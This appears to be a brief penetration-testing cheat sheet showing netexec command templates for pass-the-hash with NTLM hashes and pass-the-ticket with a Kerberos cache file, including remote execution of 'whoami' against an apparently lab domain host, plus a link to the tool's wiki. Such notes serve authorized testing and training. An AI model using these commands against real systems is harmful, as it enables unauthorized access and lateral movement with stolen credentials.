# $ netexec - pass-the-hash
```bash
$ netexec <protocol> <IP> -u <user> -H <ntlm_hash>
$ netexec <protocol> <IP> -u <users_file> -H <ntlm_hashes_file>
```
# $ netexec - pass-the-ticket
```bash
$ export KRB5CCNAME=/home/bonclay/impacket/administrator.ccache
$ nxc smb zoro.gold.local --use-kcache
$ sudo nxc smb zoro.gold.local --use-kcache -x whoami

```
https://www.netexec.wiki/getting-started/using-kerberos
